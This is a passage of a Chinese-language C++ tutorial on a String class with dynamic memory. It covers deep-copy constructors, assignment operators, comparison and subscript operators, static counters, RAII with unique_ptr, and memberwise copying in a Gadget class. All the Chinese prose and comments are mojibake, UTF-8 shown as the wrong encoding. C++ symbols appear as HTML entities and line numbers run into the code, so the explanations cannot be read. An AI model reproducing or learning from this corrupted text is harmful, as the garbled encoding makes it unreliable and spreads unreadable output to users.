Copy)String::String(const String &amp; st) &#123; num_strings++; // æ›´æ–°é™æ€è®¡æ•°å™¨ len = st.len; // å¤åˆ¶é•¿åº¦ str = new char [len + 1]; // *** ä¸ºæ–°å¯¹è±¡åˆ†é…è‡ªå·±çš„å†…å­˜ *** std::strcpy(str, st.str); // *** å°†æ•°æ®å¤åˆ¶åˆ°æ–°å†…å­˜ä¸­ *** // std::cout &lt;&lt; &quot;COPY constructor called for &quot; &lt;&lt; str &lt;&lt; &quot;\\n&quot;; // è°ƒè¯•ä¿¡æ¯&#125; ç°åœ¨ï¼Œå½“ String s2 = s1; æ‰§è¡Œæ—¶ï¼Œs2 ä¼šæ‹¥æœ‰è‡ªå·±ç‹¬ç«‹çš„ä¸€å—å†…å­˜ï¼Œå…¶ä¸­åŒ…å«ä¸ s1 ç›¸åŒå†…å®¹çš„å­—ç¬¦ä¸²å‰¯æœ¬ã€‚s1 å’Œ s2 çš„ str æŒ‡é’ˆå°†æŒ‡å‘ä¸åŒçš„å†…å­˜åœ°å€ã€‚ 2. èµ‹å€¼è¿ç®—ç¬¦ (Assignment Operator) å½“å°†ä¸€ä¸ªå·²å­˜åœ¨çš„å¯¹è±¡èµ‹å€¼ç»™å¦ä¸€ä¸ªå·²å­˜åœ¨çš„å¯¹è±¡æ—¶ï¼ˆä¾‹å¦‚ s2 = s1;ï¼‰ï¼Œèµ‹å€¼è¿ç®—ç¬¦ä¼šè¢«è°ƒç”¨ã€‚å®ƒéœ€è¦åšæ›´å¤šå·¥ä½œï¼š 12345678910111213141516171819// string1.cpp excerpt// Assignment Operator (Deep Copy)String &amp; String::operator=(const String &amp; st) &#123; // std::cout &lt;&lt; &quot;Assignment operator called for &quot; &lt;&lt; str &lt;&lt; &quot;\\n&quot;; // è°ƒè¯•ä¿¡æ¯ // 1. è‡ªæˆ‘èµ‹å€¼æ£€æŸ¥: é˜²æ­¢ obj = obj; å¯¼è‡´æ„å¤–åˆ é™¤ if (this == &amp;st) return *this; // è¿”å›å½“å‰å¯¹è±¡ // 2. é‡Šæ”¾æ—§å†…å­˜: é‡Šæ”¾å½“å‰å¯¹è±¡ (*this) åŸæ¥å ç”¨çš„å†…å­˜ delete [] str; // 3. æ·±å¤åˆ¶: ä¸å¤åˆ¶æ„é€ å‡½æ•°ç±»ä¼¼ len = st.len; str = new char [len + 1]; // åˆ†é…æ–°å†…å­˜ std::strcpy(str, st.str); // å¤åˆ¶æ•°æ® // 4. è¿”å›å¼•ç”¨: è¿”å›å¯¹è°ƒç”¨å¯¹è±¡ (*this) çš„å¼•ç”¨ï¼Œä»¥æ”¯æŒé“¾å¼èµ‹å€¼ (a = b = c) return *this;&#125; è¿™ä¸ªå®ç°ç¡®ä¿äº†ï¼š è‡ªæˆ‘èµ‹å€¼å®‰å…¨: å¦‚æœå°è¯• s1 = s1;ï¼Œæ“ä½œä¼šç›´æ¥è¿”å›ï¼Œä¸ä¼šé”™è¯¯åœ°é‡Šæ”¾å†…å­˜ã€‚ å†…å­˜ç®¡ç†: åœ¨å¤åˆ¶æ–°æ•°æ®ä¹‹å‰ï¼Œæ­£ç¡®é‡Šæ”¾äº†å¯¹è±¡åŸæ¥å ç”¨çš„å†…å­˜ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼ã€‚ æ·±å¤åˆ¶: ä¸ºå¯¹è±¡åˆ†é…äº†æ–°çš„å†…å­˜å¹¶å¤åˆ¶äº†æ•°æ®ã€‚ 12.2.1 ä¿®è®¢åçš„é»˜è®¤æ„é€ å‡½æ•°é»˜è®¤æ„é€ å‡½æ•°ç°åœ¨åˆ›å»ºä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯åƒ StringBad é‚£æ ·åˆ›å»ºä¸€ä¸ª â€œC++â€ å­—ç¬¦ä¸²ã€‚è¿™é€šå¸¸æ›´æœ‰ç”¨ã€‚ 1234567// string1.cpp excerptString::String() &#123; // default constructor len = 0; str = new char[1]; // åˆ†é…è¶³å¤Ÿå­˜å‚¨ç©ºå­—ç¬¦ &#x27;\\0&#x27; çš„ç©ºé—´ str[0] = &#x27;\\0&#x27;; // è®¾ç½®ä¸ºç©ºå­—ç¬¦ä¸² num_strings++;&#125; 12.2.2 æ¯”è¾ƒæˆå‘˜å‡½æ•°ä¸ºäº†èƒ½å¤Ÿæ¯”è¾ƒ String å¯¹è±¡ï¼Œæˆ‘ä»¬é‡è½½äº†å…³ç³»è¿ç®—ç¬¦ ==, &lt;, &gt;ã€‚è¿™äº›é€šå¸¸å®ç°ä¸ºå‹å…ƒå‡½æ•°ï¼Œå› ä¸ºæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿæ¯”è¾ƒ string1 == string2ï¼Œå¹¶ä¸”å®ƒä»¬éœ€è¦è®¿é—®ç§æœ‰æˆå‘˜ strã€‚æˆ‘ä»¬åˆ©ç”¨ C åº“å‡½æ•° strcmp() æ¥è¿›è¡Œæ¯”è¾ƒã€‚ 123456789101112// string1.cpp excerpt (å‹å…ƒå‡½æ•°å®šä¹‰)bool operator&lt;(const String &amp;st1, const String &amp;st2) &#123; return (std::strcmp(st1.str, st2.str) &lt; 0);&#125;bool operator&gt;(const String &amp;st1, const String &amp;st2) &#123; return st2 &lt; st1; // åˆ©ç”¨å·²å®šä¹‰çš„ operator&lt;&#125;bool operator==(const String &amp;st1, const String &amp;st2) &#123; return (std::strcmp(st1.str, st2.str) == 0);&#125; 12.2.3 ä½¿ç”¨ä¸­æ‹¬å·è¡¨ç¤ºæ³•è®¿é—®å­—ç¬¦ä¸ºäº†åƒè®¿é—®æ™®é€š C å­—ç¬¦ä¸²æ•°ç»„ä¸€æ ·è®¿é—® String å¯¹è±¡ä¸­çš„å•ä¸ªå­—ç¬¦ï¼ˆä¾‹å¦‚ myString[0]ï¼‰ï¼Œæˆ‘ä»¬é‡è½½äº†ä¸‹æ ‡è¿ç®—ç¬¦ []ã€‚é€šå¸¸éœ€è¦æä¾›ä¸¤ä¸ªç‰ˆæœ¬ï¼š é const ç‰ˆæœ¬: char &amp; operator[](int i); è¿”å›ä¸€ä¸ª char çš„å¼•ç”¨ï¼Œå…è®¸ä¿®æ”¹å­—ç¬¦ï¼ˆä¾‹å¦‚ myString[0] = &#39;H&#39;;ï¼‰ã€‚ const ç‰ˆæœ¬: const char &amp; operator[](int i) const; ç”¨äº const String å¯¹è±¡ï¼Œè¿”å›ä¸€ä¸ª const char çš„å¼•ç”¨ï¼Œåªå…è®¸è¯»å–å­—ç¬¦ï¼ˆä¾‹å¦‚ const String greeting = &quot;Hi&quot;; char c = greeting[0];ï¼‰ã€‚ 123456789101112// string1.cpp excerpt// read-write char access for non-const Stringchar &amp; String::operator[](int i) &#123; // æ³¨æ„ï¼šä¸ºäº†ç®€åŒ–ï¼Œè¿™é‡Œæ²¡æœ‰æ·»åŠ è¾¹ç•Œæ£€æŸ¥ return str[i];&#125;// read-only char access for const Stringconst char &amp; String::operator[](int i) const &#123; // æ³¨æ„ï¼šä¸ºäº†ç®€åŒ–ï¼Œè¿™é‡Œæ²¡æœ‰æ·»åŠ è¾¹ç•Œæ£€æŸ¥ return str[i];&#125; å®é™…åº”ç”¨ä¸­é€šå¸¸éœ€è¦æ·»åŠ è¾¹ç•Œæ£€æŸ¥ï¼ˆæ£€æŸ¥ i æ˜¯å¦åœ¨ 0 åˆ° len-1 çš„æœ‰æ•ˆèŒƒå›´å†…ï¼‰ã€‚ 12.2.4 é™æ€ç±»æˆå‘˜å‡½æ•°æˆ‘ä»¬ä¿ç•™äº†é™æ€æˆå‘˜ num_strings å’Œé™æ€æˆå‘˜å‡½æ•° HowMany() æ¥è·Ÿè¸ªå·²åˆ›å»ºçš„ String å¯¹è±¡æ•°é‡ã€‚ 123456789101112131415// string1.h excerptclass String &#123; // ... static int num_strings;public: // ... static int HowMany();&#125;;// string1.cpp excerptint String::num_strings = 0; // åˆå§‹åŒ–int String::HowMany() &#123; return num_strings;&#125; 12.2.5 è¿›ä¸€æ­¥é‡è½½èµ‹å€¼è¿ç®—ç¬¦é™¤äº†ä»å¦ä¸€ä¸ª String å¯¹è±¡èµ‹å€¼ï¼Œæˆ‘ä»¬é€šå¸¸è¿˜å¸Œæœ›èƒ½å¤Ÿç›´æ¥ä» C é£æ ¼å­—ç¬¦ä¸² (const char*) èµ‹å€¼ï¼Œä¾‹å¦‚ myString = &quot;Hello&quot;;ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬é‡è½½äº†å¦ä¸€ä¸ªç‰ˆæœ¬çš„èµ‹å€¼è¿ç®—ç¬¦ã€‚ 123456789101112131415161718// string1.h excerptclass String &#123; // ...public: // ... String &amp; operator=(const String &amp;); // String = String String &amp; operator=(const char *); // String = &quot;C-string&quot; // ...&#125;;// string1.cpp excerptString &amp; String::operator=(const char * s) &#123; delete [] str; // é‡Šæ”¾æ—§å†…å­˜ len = std::strlen(s); str = new char[len + 1]; std::strcpy(str, s); return *this; // è¿”å›å¼•ç”¨&#125; ä½¿ç”¨æ”¹è¿›åçš„ String ç±» ç°åœ¨ï¼Œä½¿ç”¨è¿™ä¸ªæ”¹è¿›åçš„ String ç±»ï¼ˆå®šä¹‰åœ¨ string1.h å’Œ string1.cpp ä¸­ï¼‰ï¼Œä¹‹å‰å¯¼è‡´é—®é¢˜çš„ä»£ç å¯ä»¥å®‰å…¨è¿è¡Œäº†ã€‚ä¸‹é¢çš„ç¤ºä¾‹ç¨‹åº (sayings1.cpp) å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨è¿™ä¸ªç±»ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// sayings1.cpp -- ä½¿ç”¨æ”¹è¿›çš„ String ç±»#include &lt;iostream&gt;#include &quot;string1.h&quot; // ä½¿ç”¨ string1.hconst int ArSize = 10;const int MaxLen = 81;int main() &#123; using std::cout; using std::cin; using std::endl; String name; // è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•° cout &lt;&lt; &quot;Hi, what&#x27;s your name?\\n&gt;&gt; &quot;; cin &gt;&gt; name; // è°ƒç”¨ operator&gt;&gt; cout &lt;&lt; name &lt;&lt; &quot;, please enter up to &quot; &lt;&lt; ArSize &lt;&lt; &quot; short sayings &lt;empty line to quit&gt;:\\n&quot;; String sayings[ArSize]; // è°ƒç”¨ ArSize æ¬¡é»˜è®¤æ„é€ å‡½æ•° char temp[MaxLen]; int i; for (i = 0; i &lt; ArSize; i++) &#123; cout &lt;&lt; i + 1 &lt;&lt; &quot;: &quot;; cin.get(temp, MaxLen); // è¯»å–ä¸€è¡Œ while (cin &amp;&amp; cin.get() != &#x27;\\n&#x27;) // æ¸…é™¤è¡Œå°¾æ¢è¡Œç¬¦ continue; if (!cin || temp[0] == &#x27;\\0&#x27;) // æ£€æŸ¥ç©ºè¡Œæˆ–è¾“å…¥é”™è¯¯ break; // i æœªå¢åŠ  else sayings[i] = temp; // è°ƒç”¨ operator=(const char*) &#125; int total = i; // è®°å½•å®é™…è¾“å…¥çš„æ•°é‡ if (total &gt; 0) &#123; cout &lt;&lt; &quot;Here are your sayings:\\n&quot;; for (i = 0; i &lt; total; i++) cout &lt;&lt; sayings[i][0] &lt;&lt; &quot;: &quot; &lt;&lt; sayings[i] &lt;&lt; endl; // ä½¿ç”¨ operator[] å’Œ operator&lt;&lt; // æ‰¾åˆ°æœ€çŸ­å’Œç¬¬ä¸€ä¸ªå­—æ¯é¡ºåºæœ€å°çš„å­—ç¬¦ä¸² int shortest = 0; int first = 0; for (i = 1; i &lt; total; i++) &#123; if (sayings[i].length() &lt; sayings[shortest].length()) // ä½¿ç”¨ length() shortest = i; if (sayings[i] &lt; sayings[first]) // ä½¿ç”¨ operator&lt; first = i; &#125; cout &lt;&lt; &quot;Shortest saying:\\n&quot; &lt;&lt; sayings[shortest] &lt;&lt; endl; cout &lt;&lt; &quot;First alphabetically:\\n&quot; &lt;&lt; sayings[first] &lt;&lt; endl; // ä½¿ç”¨å¤åˆ¶æ„é€ å‡½æ•° String favorite = sayings[shortest]; cout &lt;&lt; &quot;My favorite saying:\\n&quot; &lt;&lt; favorite &lt;&lt; endl; cout &lt;&lt; &quot;This program used &quot; &lt;&lt; String::HowMany() &lt;&lt; &quot; String objects. Bye.\\n&quot;; // ä½¿ç”¨ HowMany() &#125; else &#123; cout &lt;&lt; &quot;No input! Bye.\\n&quot;; &#125; return 0;&#125; è¿™ä¸ªç¨‹åºç°åœ¨å¯ä»¥æ­£ç¡®åœ°åˆ›å»ºã€å¤åˆ¶ã€èµ‹å€¼å’Œé”€æ¯ String å¯¹è±¡ï¼Œè€Œä¸ä¼šå‡ºç°å†…å­˜æ³„æ¼æˆ–å´©æºƒï¼Œå› ä¸ºæˆ‘ä»¬æä¾›äº†æ­£ç¡®çš„ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦æ¥å¤„ç†åŠ¨æ€å†…å­˜ã€‚ 12.3 åœ¨æ„é€ å‡½æ•°ä¸­ä½¿ç”¨ new æ—¶åº”æ³¨æ„çš„äº‹é¡¹å½“ç±»çš„æ„é€ å‡½æ•°ä½¿ç”¨ new æ¥åˆ†é…åŠ¨æ€å†…å­˜æ—¶ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„å†…å­˜ç®¡ç†å’Œæ½œåœ¨çš„é”™è¯¯æƒ…å†µï¼Œä»¥ç¡®ä¿ç¨‹åºçš„å¥å£®æ€§å’Œé¿å…èµ„æºæ³„æ¼ã€‚ 12.3.1 åº”è¯¥å’Œä¸åº”è¯¥åº”è¯¥åšçš„äº‹: åœ¨ææ„å‡½æ•°ä¸­ä½¿ç”¨ delete: å¦‚æœæ„é€ å‡½æ•°ä½¿ç”¨ new åˆ†é…äº†å†…å­˜ï¼Œé‚£ä¹ˆå¿…é¡»åœ¨ææ„å‡½æ•°ä¸­ä½¿ç”¨ deleteï¼ˆæˆ– delete[] å¦‚æœåˆ†é…çš„æ˜¯æ•°ç»„ï¼‰æ¥é‡Šæ”¾è¿™äº›å†…å­˜ã€‚è¿™æ˜¯é˜²æ­¢å†…å­˜æ³„æ¼çš„åŸºæœ¬è¦æ±‚ã€‚ 1234567891011121314151617class MyClass &#123;private: int * data; size_t size;public: MyClass(size_t n) : size(n) &#123; data = new int[size]; // åˆ†é…å†…å­˜ // ... åˆå§‹åŒ– data ... std::cout &lt;&lt; &quot;MyClass constructed, allocated memory.\\n&quot;; &#125; ~MyClass() &#123; delete [] data; // *** å¿…é¡»åœ¨ææ„å‡½æ•°ä¸­é‡Šæ”¾å†…å­˜ *** std::cout &lt;&lt; &quot;MyClass destructed, freed memory.\\n&quot;; &#125; // *** è¿˜éœ€è¦å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ (Rule of Three/Five) *** // ...&#125;; ä½¿ç”¨ delete[] é‡Šæ”¾æ•°ç»„: å¦‚æœæ„é€ å‡½æ•°ä½¿ç”¨ new T[size] åˆ†é…äº†æ•°ç»„ï¼Œææ„å‡½æ•°å¿…é¡»ä½¿ç”¨ delete[] æ¥é‡Šæ”¾ã€‚å¦‚æœä½¿ç”¨ new T åˆ†é…å•ä¸ªå¯¹è±¡ï¼Œåˆ™ä½¿ç”¨ deleteã€‚æ··ç”¨ä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºã€‚ å®ç°æ·±å¤åˆ¶: å¦‚æœç±»ç®¡ç†åŠ¨æ€å†…å­˜ï¼Œå¿…é¡»æä¾›è‡ªå®šä¹‰çš„å¤åˆ¶æ„é€ å‡½æ•°å’Œå¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦æ¥æ‰§è¡Œæ·±å¤åˆ¶ï¼Œä»¥é¿å…æµ…å¤åˆ¶å¸¦æ¥çš„é—®é¢˜ï¼ˆå¦‚é‡å¤åˆ é™¤ã€æ‚¬æŒ‚æŒ‡é’ˆï¼‰ã€‚ ä¸åº”è¯¥åšçš„äº‹ (æˆ–éœ€è¦æ³¨æ„): å¿˜è®° delete: ä¸åœ¨ææ„å‡½æ•°ä¸­é‡Šæ”¾æ„é€ å‡½æ•°åˆ†é…çš„å†…å­˜ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ã€‚æ¯æ¬¡å¯¹è±¡é”€æ¯æ—¶ï¼Œå®ƒå ç”¨çš„åŠ¨æ€å†…å­˜éƒ½ä¸ä¼šè¢«å›æ”¶ã€‚ æ„é€ å‡½æ•°ä¸­ new å¤±è´¥: new è¿ç®—ç¬¦åœ¨æ— æ³•åˆ†é…æ‰€éœ€å†…å­˜æ—¶ï¼Œé»˜è®¤ä¼šæŠ›å‡º std::bad_alloc å¼‚å¸¸ã€‚ å¦‚æœ new æŠ›å‡ºå¼‚å¸¸ï¼Œå¯¹è±¡çš„æ„é€ è¿‡ç¨‹ä¼šç«‹å³ç»ˆæ­¢ã€‚ é‡è¦çš„æ˜¯ï¼Œå¯¹è±¡çš„ææ„å‡½æ•°ä¸ä¼šè¢«è°ƒç”¨ï¼Œå› ä¸ºå¯¹è±¡ä»æœªè¢«å®Œå…¨æ„é€ ã€‚ è¿™æ„å‘³ç€ï¼Œå¦‚æœåœ¨æŠ›å‡ºå¼‚å¸¸çš„ new ä¹‹å‰ï¼Œæ„é€ å‡½æ•°å·²ç»æˆåŠŸåˆ†é…äº†å…¶ä»–åŠ¨æ€èµ„æºï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡å¦ä¸€ä¸ª newï¼‰ï¼Œé‚£ä¹ˆè¿™äº›èµ„æºå¯èƒ½ä¼šæ³„æ¼ï¼Œå› ä¸ºæ²¡æœ‰ææ„å‡½æ•°æ¥æ¸…ç†å®ƒä»¬ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738class Problematic &#123;private: int * data1; char * data2;public: Problematic(size_t n1, size_t n2) : data1(nullptr), data2(nullptr) &#123; // åˆå§‹åŒ–ä¸º nullptr try &#123; data1 = new int[n1]; std::cout &lt;&lt; &quot;Allocated data1\\n&quot;; // *** å¦‚æœä¸‹é¢çš„ new å¤±è´¥ *** data2 = new char[n2]; std::cout &lt;&lt; &quot;Allocated data2\\n&quot;; &#125; catch (const std::bad_alloc &amp; ba) &#123; std::cerr &lt;&lt; &quot;Memory allocation failed: &quot; &lt;&lt; ba.what() &lt;&lt; std::endl; // *** ææ„å‡½æ•°ä¸ä¼šè°ƒç”¨ï¼Œéœ€è¦åœ¨è¿™é‡Œæ‰‹åŠ¨æ¸…ç† data1 (å¦‚æœå·²åˆ†é…) *** delete [] data1; // å¦‚æœ data1 åˆ†é…æˆåŠŸä½† data2 å¤±è´¥ï¼Œéœ€è¦é‡Šæ”¾ data1 data1 = nullptr; // é¿å…æ‚¬æŒ‚æŒ‡é’ˆ (è™½ç„¶å¯¹è±¡æ„é€ å¤±è´¥äº†) // é‡æ–°æŠ›å‡ºå¼‚å¸¸æˆ–å¤„ç†é”™è¯¯ throw; // é‡æ–°æŠ›å‡ºï¼Œè®©è°ƒç”¨è€…çŸ¥é“æ„é€ å¤±è´¥ &#125; &#125; ~Problematic() &#123; std::cout &lt;&lt; &quot;Problematic destructor called\\n&quot;; delete [] data1; delete [] data2; &#125; // ... å¤åˆ¶æ§åˆ¶ ...&#125;;int main() &#123; try &#123; // å°è¯•åˆ†é…éå¸¸å¤§çš„å†…å­˜ï¼Œå¯èƒ½ä¼šå¤±è´¥ Problematic p(100, 1000000000000ULL); &#125; catch (...) &#123; std::cerr &lt;&lt; &quot;Failed to create Problematic object.\\n&quot;; &#125; return 0;&#125; æ›´å¥½çš„æ–¹æ³•: ä½¿ç”¨ RAIIï¼ˆèµ„æºè·å–å³åˆå§‹åŒ–ï¼‰åŸåˆ™ï¼Œä¾‹å¦‚ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆï¼ˆå¦‚ std::unique_ptrï¼‰æ¥ç®¡ç†åŠ¨æ€å†…å­˜ã€‚æ™ºèƒ½æŒ‡é’ˆä¼šåœ¨å…¶è‡ªèº«è¢«é”€æ¯æ—¶è‡ªåŠ¨é‡Šæ”¾æ‰€ç®¡ç†çš„å†…å­˜ï¼Œå³ä½¿å‘ç”Ÿå¼‚å¸¸å¯¼è‡´æ ˆå±•å¼€ï¼Œä¹Ÿèƒ½ä¿è¯èµ„æºè¢«é‡Šæ”¾ã€‚ 1234567891011121314151617181920212223242526#include &lt;memory&gt; // for std::unique_ptrclass BetterClass &#123;private: std::unique_ptr&lt;int[]&gt; data1; // ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆç®¡ç†æ•°ç»„ std::unique_ptr&lt;char[]&gt; data2;public: BetterClass(size_t n1, size_t n2) : data1(new int[n1]), data2(new char[n2]) // ç›´æ¥åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­åˆ†é… &#123; std::cout &lt;&lt; &quot;BetterClass constructed.\\n&quot;; // å¦‚æœ new å¤±è´¥ï¼Œå¼‚å¸¸ä¼šæŠ›å‡ºï¼Œå·²æˆåŠŸæ„é€ çš„ unique_ptr (å¦‚æœæœ‰) ä¼šè‡ªåŠ¨é‡Šæ”¾å†…å­˜ // ä¸éœ€è¦ try-catch æ¥æ‰‹åŠ¨ delete &#125; // ä¸éœ€è¦æ˜¾å¼ææ„å‡½æ•°æ¥ delete data1/data2ï¼Œunique_ptr ä¼šè‡ªåŠ¨å¤„ç† // ä½†ä»ç„¶éœ€è¦éµå¾ª Rule of Three/Five/Zero (ä½¿ç”¨ unique_ptr é€šå¸¸éµå¾ª Rule of Zero) ~BetterClass() &#123; std::cout &lt;&lt; &quot;BetterClass destructed.\\n&quot;; &#125; // å¯èƒ½éœ€è¦è‡ªå®šä¹‰å¤åˆ¶/ç§»åŠ¨æ“ä½œï¼Œæˆ–è€…ç¦ç”¨å®ƒä»¬ï¼Œå› ä¸º unique_ptr é»˜è®¤ä¸å¯å¤åˆ¶ BetterClass(const BetterClass&amp;) = delete; BetterClass&amp; operator=(const BetterClass&amp;) = delete; // å¯ä»¥æ·»åŠ ç§»åŠ¨æ“ä½œ BetterClass(BetterClass&amp;&amp;) = default; BetterClass&amp; operator=(BetterClass&amp;&amp;) = default;&#125;; 12.3.2 åŒ…å«ç±»æˆå‘˜çš„ç±»çš„é€æˆå‘˜å¤åˆ¶å½“ä¸€ä¸ªç±»ï¼ˆç§°ä¸ºåŒ…å«ç±»æˆ–å®¹å™¨ç±»ï¼‰åŒ…å«å…¶ä»–ç±»çš„å¯¹è±¡ä½œä¸ºå…¶æˆå‘˜æ—¶ï¼Œé»˜è®¤çš„å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦çš„è¡Œä¸ºä»ç„¶æ˜¯æˆå‘˜é€ä¸€å¤åˆ¶ã€‚ è¿™æ„å‘³ç€å¯¹äºå®¹å™¨ç±»ä¸­çš„æ¯ä¸ªæˆå‘˜ï¼š å¦‚æœæ˜¯å†…ç½®ç±»å‹ï¼ˆint, double, æŒ‡é’ˆç­‰ï¼‰ï¼Œåˆ™æŒ‰å€¼å¤åˆ¶ã€‚ å¦‚æœæ˜¯ç±»å¯¹è±¡ï¼Œåˆ™è°ƒç”¨è¯¥æˆå‘˜å¯¹è±¡çš„å¤åˆ¶æ„é€ å‡½æ•°ï¼ˆå¯¹äºå®¹å™¨çš„å¤åˆ¶æ„é€ ï¼‰æˆ–èµ‹å€¼è¿ç®—ç¬¦ï¼ˆå¯¹äºå®¹å™¨çš„èµ‹å€¼è¿ç®—ï¼‰ã€‚ ç¤ºä¾‹: å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª Gadget ç±»ï¼Œå®ƒåŒ…å«ä¸€ä¸ªæˆ‘ä»¬ä¹‹å‰æ”¹è¿›è¿‡çš„ String å¯¹è±¡ï¼ˆæ¥è‡ª string1.hï¼‰ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940// gadget.h#ifndef GADGET_H_#define GADGET_H_#include &quot;string1.h&quot; // åŒ…å«æ”¹è¿›çš„ String ç±»class Gadget &#123;private: String name; // æˆå‘˜æ˜¯ String å¯¹è±¡ int id;public: Gadget(const char * s = &quot;Default Gadget&quot;, int i = 0) : name(s), id(i) &#123;&#125; Gadget(const String&amp; s, int i = 0) : name(s), id(i) &#123;&#125; // *** æ²¡æœ‰æ˜¾å¼å®šä¹‰å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ *** void show() const &#123; std::cout &lt;&lt; &quot;ID: &quot; &lt;&lt; id &lt;&lt; &quot;, Name: &quot; &lt;&lt; name &lt;&lt; std::endl; &#125;&#125;;#endif // GADGET_H_// main.cpp#include &lt;iostream&gt;#include &quot;gadget.h&quot;int main() &#123; Gadget g1(&quot;Flux Capacitor&quot;, 121); g1.show(); std::cout &lt;&lt; &quot;\\n--- Copying g1 to g2 ---\\n&quot;; Gadget g2 = g1; // è°ƒç”¨ Gadget çš„é»˜è®¤å¤åˆ¶æ„é€ å‡½æ•° g2.show(); std::cout &lt;&lt; &quot;\\n--- Assigning g1 to g3 ---\\n&quot;; Gadget g3; // è°ƒç”¨ Gadget é»˜è®¤æ„é€ å‡½æ•° (name ä¼šè°ƒç”¨ String é»˜è®¤æ„é€ å‡½æ•°) g3.show(); g3 = g1; // è°ƒç”¨ Gadget çš„é»˜è®¤èµ‹å€¼è¿ç®—ç¬¦ g3.show(); std::cout &lt;&lt; &quot;\\n--- End of main ---\\n&quot;; return 0; // g1, g2, g3 çš„ææ„å‡½æ•°è¢«è°ƒç”¨&#125; å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ Gadget g2 = g1; (é»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°): ç¼–è¯‘å™¨ç”Ÿæˆçš„ Gadget å¤åˆ¶æ„é€ å‡½æ•°ä¼šæ‰§è¡Œæˆå‘˜é€ä¸€å¤åˆ¶ã€‚ å¯¹äº int id æˆå‘˜ï¼šg2.id è¢«è®¾ç½®ä¸º g1.id çš„å€¼ (121)ã€‚ å¯¹äº String name æˆå‘˜ï¼šè°ƒç”¨ String ç±»çš„å¤åˆ¶æ„é€ å‡½æ•° String(const String&amp;) æ¥åˆå§‹åŒ– g2.nameï¼Œä½¿ç”¨ g1.name ä½œä¸ºæºã€‚å› ä¸ºæˆ‘ä»¬çš„ String ç±»æœ‰æ­£ç¡®çš„æ·±å¤åˆ¶æ„é€ å‡½æ•°ï¼Œæ‰€ä»¥ g2.name ä¼šè·å¾— g1.name å†…å®¹çš„ç‹¬ç«‹å‰¯æœ¬ã€‚ g3 = g1; (é»˜è®¤èµ‹å€¼è¿ç®—ç¬¦): ç¼–è¯‘å™¨ç”Ÿæˆçš„ Gadget èµ‹å€¼è¿ç®—ç¬¦ä¼šæ‰§è¡Œæˆå‘˜é€ä¸€èµ‹å€¼ã€‚ å¯¹äº int id æˆå‘˜ï¼šg3.id è¢«è®¾ç½®ä¸º g1.id çš„å€¼ã€‚ å¯¹äº String name æˆå‘˜ï¼šè°ƒç”¨ String ç±»çš„èµ‹å€¼è¿ç®—ç¬¦ operator=(const String&amp;)ï¼Œå°† g1.name èµ‹ç»™ g3.name (g3.name = g1.name;)ã€‚å› ä¸º String ç±»æœ‰æ­£ç¡®çš„æ·±å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ï¼ˆå®ƒä¼šå…ˆé‡Šæ”¾ g3.name çš„æ—§å†…å­˜ï¼Œç„¶ååˆ†é…æ–°å†…å­˜å¹¶å¤åˆ¶å†…å®¹ï¼‰ï¼Œæ‰€ä»¥èµ‹å€¼æ“ä½œæ˜¯å®‰å…¨çš„ã€‚ ç»“è®º: å¦‚æœä¸€ä¸ªç±»åŒ…å«å…¶ä»–ç±»çš„å¯¹è±¡ä½œä¸ºæˆå‘˜ï¼Œå¹¶ä¸”è¿™äº›æˆå‘˜å¯¹è±¡æ‰€å±çš„ç±»å·²ç»æ­£ç¡®åœ°å®ç°äº†å®ƒä»¬è‡ªå·±çš„å¤åˆ¶æ§åˆ¶ï¼ˆå³å®ƒä»¬èƒ½å®‰å…¨åœ°è¿›è¡Œæ·±å¤åˆ¶å’Œå†…å­˜ç®¡ç†ï¼Œåƒæˆ‘ä»¬çš„ String ç±»æˆ–æ ‡å‡†åº“ç±» std::string, std::vector ç­‰ï¼‰ï¼Œé‚£ä¹ˆå¯¹äºè¿™äº›æˆå‘˜æ¥è¯´ï¼ŒåŒ…å«ç±»çš„é»˜è®¤æˆå‘˜é€ä¸€å¤åˆ¶è¡Œä¸ºé€šå¸¸æ˜¯è¶³å¤Ÿä¸”å®‰å…¨çš„ã€‚ ä½†æ˜¯ï¼Œå¦‚æœåŒ…å«ç±»æœ¬èº«è¿˜ç›´æ¥ç®¡ç†å…¶ä»–åŠ¨æ€å†…å­˜ï¼ˆä¾‹å¦‚ï¼ŒGadget ç±»é™¤äº† String name ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ª int* extra_data æŒ‡é’ˆï¼Œå¹¶ä¸” Gadget è´Ÿè´£ new/delete è¿™ä¸ªæŒ‡é’ˆï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ªåŒ…å«ç±»ä»ç„¶éœ€è¦æä¾›è‡ªå·±çš„è‡ªå®šä¹‰å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦æ¥å¤„ç† extra_data çš„æ·±å¤åˆ¶ï¼Œå³ä½¿ String name æˆå‘˜çš„å¤åˆ¶å¯ä»¥ç”± String ç±»è‡ªå·±å¤„ç†ã€‚ è¿™å°±æ˜¯é›¶æ³•åˆ™ (Rule of Zero) 